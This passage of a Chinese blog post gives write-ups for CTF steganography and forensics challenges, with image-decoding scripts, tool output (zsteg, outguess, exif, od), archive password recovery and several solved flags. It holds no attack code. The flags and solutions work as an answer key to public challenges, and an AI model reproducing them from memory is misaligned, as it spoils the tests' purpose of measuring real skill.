class="comment">#黑点为1白点为0</span></span><br><span class="line">data = <span class="string">&quotquot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(length):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(length):</span><br><span class="line">        <span class="keyword">if</span> data[x*length+y] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> xx <span class="keyword">in</span> range(x*<span class="number">5</span>, x*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> yy <span class="keyword">in</span> range(y*<span class="number">5</span>, y*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                    img.putpixel([xx, yy], (<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">for</span> xx <span class="keyword">in</span> range(x*<span class="number">5</span>, x*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                <span class="keyword">for</span> yy <span class="keyword">in</span> range(y*<span class="number">5</span>, y*<span class="number">5</span>+<span class="number">5</span>):</span><br><span class="line">                    img.putpixel([xx, yy], (<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">img.save(<span class="string">&#x27;out.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>扫描之后拿到<code>od -vtx1 ./draw.png | head -56 | tail -28</code>。</p><p>放入kali执行。od是一个linux命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">0000700 01 00 02 10 03 10 00 00 01 ee c0 b8 a6 00 00 00</span><br><span class="line">0000720 ff ff ff 00 ff ff ff ff 00 ff ff 00 00 00 ff ff</span><br><span class="line">0000740 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0000760 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001000 ff ff 00 00 00 00 ff 00 00 ff 00 ff 00 ff 00 00</span><br><span class="line">0001020 ff 00 ff 00 00 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001040 ff 00 ff 00 ff 00 ff 00 00 ff 00 ff 00 00 ff 00</span><br><span class="line">0001060 ff ff ff 00 ff ff ff 00 00 ff ff 00 00 00 ff ff</span><br><span class="line">0001100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001120 ff ff ff 00 ff ff ff 00 ff ff ff 00 ff ff 00 00</span><br><span class="line">0001140 ff 00 00 00 00 00 ff 00 00 00 ff 00 00 ff 00 00</span><br><span class="line">0001160 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 ff 00 00</span><br><span class="line">0001200 00 00 ff 00 00 00 ff 00 ff 00 00 00 00 ff 00 00</span><br><span class="line">0001220 ff ff ff 00 00 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001260 ff ff ff 00 ff 00 ff 00 ff ff ff 00 ff ff ff 00</span><br><span class="line">0001300 ff 00 00 00 ff 00 ff 00 ff 00 ff 00 00 00 ff 00</span><br><span class="line">0001320 ff ff ff 00 ff ff ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001340 00 00 ff 00 00 00 ff 00 00 00 ff 00 00 00 ff 00</span><br><span class="line">0001360 ff ff ff 00 00 00 ff 00 ff ff ff 00 00 00 ff 00</span><br><span class="line">0001400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001420 ff ff ff 00 ff ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001440 ff 00 00 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001460 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001500 ff 00 ff 00 00 ff ff 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001520 ff 00 ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001540 ff ff ff 00 00 ff 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0001560 00 00 00 00 ff ff 00 63 da e9 3c 36 b1 aa 93 59</span><br></pre></td></tr></table></figure><p>把 ff 高亮一下显示发现并不是二维码，直接显示的是 flag 的图像了，结果是 BJD{572154976}。</p><h3 id="BJDCTF2020-鸡你太美"><a href="#BJDCTF2020-鸡你太美" class="headerlink" title="[BJDCTF2020]鸡你太美"></a>[BJDCTF2020]鸡你太美</h3><p>两个gif文件，一个损坏。</p><p>先对正常的进行分帧，没有发现异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert flag.gif flag.png</span><br></pre></td></tr></table></figure><p>查看损坏的gif，使用<code>file</code>命令查看文件类型。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# file &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif&#39; </span><br><span class="line">&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;篮球副本.gif: data</span><br></pre></td></tr></table></figure><p>放入winhex，发现少头，补充头部<code>47 49 46 38</code>。</p><h3 id="ACTF新生赛2020-outguess"><a href="#ACTF新生赛2020-outguess" class="headerlink" title="[ACTF新生赛2020]outguess"></a>[ACTF新生赛2020]outguess</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# exif &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; </span><br><span class="line">‘&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg’中的EXIF 信息标识(‘摩托罗拉’字节顺序):</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">信息标识                |值</span><br><span class="line">--------------------+----------------------------------------------------------</span><br><span class="line">XP Comment          |公正民主公正文明公正和谐</span><br><span class="line">Padding             |2060 bytes undefined data</span><br><span class="line">X-Resolution        |72</span><br><span class="line">Y-Resolution        |72</span><br><span class="line">Resolution Unit     |英寸</span><br><span class="line">Padding             |2060 bytes undefined data</span><br><span class="line">Exif Version        |Exif版本2.1</span><br><span class="line">FlashPixVersion     |FlashPix版本 1.0</span><br><span class="line">色彩空间                |Internal error (unknown value 65535)</span><br><span class="line">--------------------+----------------------------------------------------------</span><br></pre></td></tr></table></figure><p>社会注意核心价值观，解码为abc。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# outguess -k abc -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg&#39; out.txt</span><br><span class="line">Reading &#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;mmm.jpg....</span><br><span class="line">Extracting usable bits:   17550 bits</span><br><span class="line">Steg retrieve: seed: 93, len: 23</span><br><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# cat out.txt </span><br><span class="line">ACTF&#123;gue33_Gu3Ss!2020&#125;</span><br></pre></td></tr></table></figure><p>直接<code>stings</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag&#x2F;output# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;output&#x2F;attachment.exe&#39; </span><br><span class="line">; ;$;(;,;0;4;8;&lt;;@;D;H;L;T;X;\;&#96;;d;</span><br><span class="line">Rar!</span><br><span class="line">CMT;</span><br><span class="line">Silent&#x3D;1</span><br><span class="line">1.txt</span><br><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br><span class="line">:flag.txt</span><br><span class="line">G3JV&quot;</span><br></pre></td></tr></table></figure><p>发现很多信息，ntf、rar、flag.txt。使用binwalk，都没有什么发现，最后直接运行exe，生成一个txt，内容为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntfs      </span><br><span class="line">flag.txt</span><br></pre></td></tr></table></figure><p>尝试ntfs隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\12521\Desktop\CTF&gt;notepad 1.txt:flag.txt</span><br></pre></td></tr></table></figure><p>直接拿到flag。</p><h3 id="谁赢了比赛？"><a href="#谁赢了比赛？" class="headerlink" title="谁赢了比赛？"></a>谁赢了比赛？</h3><p>发现一个rar。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# zsteg &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;who_won_the_game.png&#39; </span><br><span class="line">[?] 187692 bytes of extra data after image end (IEND), offset &#x3D; 0x15d2dc</span><br><span class="line">extradata:0         .. file: RAR archive data, v4, os: Win32</span><br><span class="line">    00000000: 52 61 72 21 1a 07 00 cf  90 73 00 00 0d 00 00 00  |Rar!.....s......|</span><br><span class="line">    00000010: 00 00 00 00 95 d3 74 44  94 35 00 90 dc 02 00 de  |......tD.5......|</span><br><span class="line">    00000020: 3c 03 00 02 46 d1 ab e2  bd 6a 13 47 1d 33 08 00  |&lt;...F....j.G.3..|</span><br><span class="line">    00000030: 20 00 00 00 68 65 68 65  2e 67 69 66 00 04 f8 fe  | ...hehe.gif....|</span><br><span class="line">    00000040: 42 6c d0 8d 00 b0 74 6c  37 34 b2 f5 0e 79 c4 24  |Bl....tl74...y.$|</span><br><span class="line">    00000050: 44 d5 0c 9d ba eb 18 46  c1 5d 76 a2 36 18 a2 cf  |D......F.]v.6...|</span><br><span class="line">    00000060: 38 6a 95 46 83 30 71 d7  67 36 ac 72 31 e3 b9 92  |8j.F.0q.g6.r1...|</span><br><span class="line">    00000070: b5 2f c7 b9 55 a9 59 ed  54 a8 23 d6 80 2a 42 ff  |.&#x2F;..U.Y.T.#..*B.|</span><br><span class="line">    00000080: 18 04 c2 f4 ba 07 9e 81  5e a3 4f 87 0c f1 50 47  |........^.O...PG|</span><br><span class="line">    00000090: 3d e9 c8 7d 35 bb a0 63  32 38 20 9a 38 c9 72 aa  |&#x3D;..&#125;5..c28 .8.r.|</span><br><span class="line">    000000a0: 9e 11 56 90 86 73 45 c5  50 51 0f 6a 67 80 9d 47  |..V..sE.PQ.jg..G|</span><br><span class="line">    000000b0: 28 05 51 20 25 33 bf ba  a2 0e 02 a8 a0 2d 43 fa  |(.Q %3.......-C.|</span><br><span class="line">    000000c0: 4b 8d 1a bb fd 33 4b 83  2d aa 14 0b 9c 32 34 ef  |K....3K.-....24.|</span><br><span class="line">    000000d0: 3f f5 46 75 00 61 44 b5  77 cc d9 e9 7e 36 ee da  |?.Fu.aD.w...~6..|</span><br><span class="line">    000000e0: 54 3d d0 20 e5 a1 75 57  3f 47 a6 d5 b3 60 8e 4b  |T&#x3D;. ..uW?G...&#96;.K|</span><br><span class="line">    000000f0: 38 6f 6a 1e 14 bc a0 f6  bb 7b 46 5e 90 49 36 d6  |8oj......&#123;F^.I6.|</span><br><span class="line">imagedata           .. text: &quot;888999999&quot;</span><br></pre></td></tr></table></figure><p>压缩包爆破拿到密码。</p><p>一个gif。分帧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;hehe.gif&#39;  flag.png</span><br></pre></td></tr></table></figure><p>其中有一个png文件。写有where flag？</p><p>对其进行分析。在red 0通道发现二维码扫描，拿到flag。<code>使用zsteg</code>发现不了二维码。</p><h3 id="喵喵喵"><a href="#喵喵喵" class="headerlink" title="喵喵喵"></a>喵喵喵</h3><p>使用<code>zsteg</code>，发现red 0有猫腻，直接data extract提取数据，发现是个png，二维码。保存修改高度，扫码。</p><p>rbg0、msb、bgr通道。用stegsolve进行颜色对换后得到一张正常的二维码，扫描后下载百度网盘的文件：flag.rar。</p><p>flag.txt内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag不在这里哦  你猜猜flag在哪里呢？  找找看吧</span><br></pre></td></tr></table></figure><p>ntf隐写，使用rar解压，ntfs工具。拿到一个pyc文件，反编译。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;tools&#x2F;python-uncompyle6-master&#x2F;bin&#x2F;uncompyle6 &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;4.pyc</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def encode():</span><br><span class="line">    flag &#x3D; &#39;*************&#39;</span><br><span class="line">    ciphertext &#x3D; []</span><br><span class="line">    for i in range(len(flag)):</span><br><span class="line">        s &#x3D; chr(i ^ ord(flag[i]))</span><br><span class="line">        if i % 2 &#x3D;&#x3D; 0:</span><br><span class="line">            s &#x3D; ord(s) + 10</span><br><span class="line">        else:</span><br><span class="line">            s &#x3D; ord(s) - 10</span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line"></span><br><span class="line">    return ciphertext[::-1]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ciphertext &#x3D; [</span><br><span class="line"> &#39;96&#39;, &#39;65&#39;, &#39;93&#39;, &#39;123&#39;, &#39;91&#39;, &#39;97&#39;, &#39;22&#39;, &#39;93&#39;, &#39;70&#39;, &#39;102&#39;, &#39;94&#39;, &#39;132&#39;, &#39;46&#39;, &#39;112&#39;, &#39;64&#39;, &#39;97&#39;, &#39;88&#39;, &#39;80&#39;, &#39;82&#39;, &#39;137&#39;, &#39;90&#39;, &#39;109&#39;, &#39;99&#39;, &#39;112&#39;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写脚本，拿到flag。</p><h3 id="BJDCTF-2nd-TARGZ-y1ng"><a href="#BJDCTF-2nd-TARGZ-y1ng" class="headerlink" title="[BJDCTF 2nd]TARGZ-y1ng"></a>[BJDCTF 2nd]TARGZ-y1ng</h3><p>压缩包名字就是压缩密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">name &#x3D; &#39;hW1ES89jF&#39;</span><br><span class="line">while True:</span><br><span class="line">    fz &#x3D; zipfile.ZipFile(name + &#39;.zip&#39;, &#39;r&#39;)</span><br><span class="line">    fz.extractall(pwd&#x3D;bytes(name, &#39;utf-8&#39;))</span><br><span class="line">    name &#x3D; fz.filelist[0].filename[0:9]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure><h3 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h3><p>binwalk分析，拿到压缩包，爆破，解压一个txt大量的字符，尝试词频分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: UTF-8 -*-</span><br><span class="line">def processLine(line, CharacterCounts):</span><br><span class="line">    for character in line:</span><br><span class="line">        #if ord(character) in range(97, 123):</span><br><span class="line">        if ord(character) in range(32,126):</span><br><span class="line">            CharacterCounts[character] +&#x3D; 1</span><br><span class="line">  </span><br><span class="line">#创建字母字典</span><br><span class="line">def createCharacterCounts(CharacterCounts):</span><br><span class="line">    #for i in range(97, 123):</span><br><span class="line">    for i in range(32, 126):</span><br><span class="line">        CharacterCounts[chr(i)] &#x3D; 0</span><br><span class="line">  </span><br><span class="line">def main():</span><br><span class="line">    #用户输入一个文件名</span><br><span class="line">    # filename &#x3D; input(&quot;enter a filename:&quot;).strip()</span><br><span class="line">    filename &#x3D; &quot;flag.txt&quot;</span><br><span class="line">    infile &#x3D; open(filename, &quot;r&quot;)</span><br><span class="line">      </span><br><span class="line">    #建立用于计算词频的空字典</span><br><span class="line">    CharacterCounts &#x3D; &#123;&#125;</span><br><span class="line">    #初始化字典键值</span><br><span class="line">    createCharacterCounts(CharacterCounts)</span><br><span class="line">    for line in infile:</span><br><span class="line">        #processLine(line.lower(), CharacterCounts)</span><br><span class="line">        processLine(line, CharacterCounts)</span><br><span class="line">          </span><br><span class="line">    #从字典中获取数据对</span><br><span class="line">    pairs &#x3D; list(CharacterCounts.items())</span><br><span class="line">  </span><br><span class="line">    #列表中的数据对交换位置,数据对排序</span><br><span class="line">    items &#x3D; [[x,y] for (y,x) in pairs] </span><br><span class="line">    items.sort(reverse&#x3D;True)</span><br><span class="line">  </span><br><span class="line">    #输出count个数词频结果</span><br><span class="line">    for i in range(len(items)):</span><br><span class="line">        #print(items[i][1]+&quot;\t&quot;+str(items[i][0]))</span><br><span class="line">        print(items[i][1],end&#x3D;&#39;&#39;)</span><br><span class="line">          </span><br><span class="line">    infile.close()</span><br><span class="line">          </span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#Author: mochu7</span></span><br><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">strings = open(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">counts = strings.count(i)</span><br><span class="line">i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.format(i)</span><br><span class="line">result[i] = counts</span><br><span class="line"></span><br><span class="line">res = sorted(result.items(),key=<span class="keyword">lambda</span> item:item[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">flag = str(i[<span class="number">0</span>])</span><br><span class="line">print(flag[<span class="number">0</span>],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h3><p><code>stings CTF</code></p><h3 id="SWPU2019-伟大的侦探"><a href="#SWPU2019-伟大的侦探" class="headerlink" title="[SWPU2019]伟大的侦探"></a>[SWPU2019]伟大的侦探</h3><p>一个压缩包，01editor 选择 EBCDIC编码得到压缩包的密码。</p><p>福尔摩斯里面的跳舞的小人加密。</p><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>一个压缩包有弱口令，爆破不出来，查看注释，莫斯密码，放入sublim。解码拿到密码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.... . .-.. .-.. ----- ..-. --- .-. --</span><br></pre></td></tr></table></figure><p>一张png图片。lsb隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;cloacked-pixel-master# python .&#x2F;lsb.py extract &#39;&#x2F;root&#x2F;桌面&#x2F;cloacked-pixel-master&#x2F;女神.png&#39;  flag.txt 123456</span><br><span class="line">[+] Image size: 500x500 pixels.</span><br><span class="line">[+] Written extracted data to flag.txt.</span><br></pre></td></tr></table></figure><h3 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&#x27;./flag.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="keyword">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += bin(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="keyword">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h3 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h3><p>只有大横杆和小横杆，猜测摩斯密码，解密拿到flag。</p><h3 id="黑客帝国"><a href="#黑客帝国" class="headerlink" title="黑客帝国"></a>黑客帝国</h3><p>一个txt，一串十六进制，开头是<code>526172211a</code>。rar文件头导入01，需要密码，爆破。</p><p>解压得到一张png图片，hex分析，没有IHDR，而是JFIF，且为<code>FF D9</code>结尾，篡改了文件头，将<code>89 50 4e 47</code>改为<code>ff d8 ff e0</code>。</p><h3 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h3><p>exif查看信息，盲文密码。解密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">ExifTool Version Number         : <span class="number">12.07</span></span><br><span class="line">File Name                       : attachment.jpg</span><br><span class="line">Directory                       : /home/steady/桌面/steady</span><br><span class="line">File Size                       : <span class="number">127</span> kB</span><br><span class="line">File Modification 